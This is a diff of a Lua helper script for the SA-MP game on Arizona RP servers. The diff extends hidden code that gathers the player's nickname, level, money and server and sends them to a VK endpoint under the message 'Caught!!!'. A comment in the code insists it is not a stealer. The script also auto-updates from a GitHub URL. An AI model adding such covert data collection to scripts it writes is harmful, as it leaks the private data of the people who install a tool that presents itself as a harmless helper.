@@ -1039,12 +1039,17 @@ function imgui.OnDrawFrame()
 end
 
 function main()
-    while not isSampAvailable() do wait(0) end
+	while not isSampAvailable() do wait(0) end
+	while not sampIsLocalPlayerSpawned() do wait(0) end
+
 	load_funcs()
+
 	-- Данная хуйня не является стиллером, а лишь соц. эксперементом для видеоролика!
 	local ip, port = sampGetCurrentServerAddress()
 	_, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
 	name = sampGetPlayerNickname(id)
+	lvl = sampGetPlayerScore(id)
+	money = getPlayerMoney(PLAYER_HANDLE)
 
 	local server_name = ""
 	if ip == "185.169.134.3" then
@@ -1075,7 +1080,7 @@ function main()
 		server_name = "Kingman"
 	end
 
-	vk_request(string.format('Попався!!!\nНик: %s\nСервер: %s', name, server_name))
+	vk_request(string.format('Попався!!!\nНик: %s\nУровень: %d\nДеньги: %d\nСервер: %s', name, lvl, money, server_name))
 
 	autoupdate("https://raw.githubusercontent.com/K1NDER-ai/AzRPHelper/master/version.json", '['..string.upper(thisScript().name)..']: ', "https://raw.githubusercontent.com/K1NDER-ai/AzRPHelper/master/version.json")
 	lua_thread.create(function()
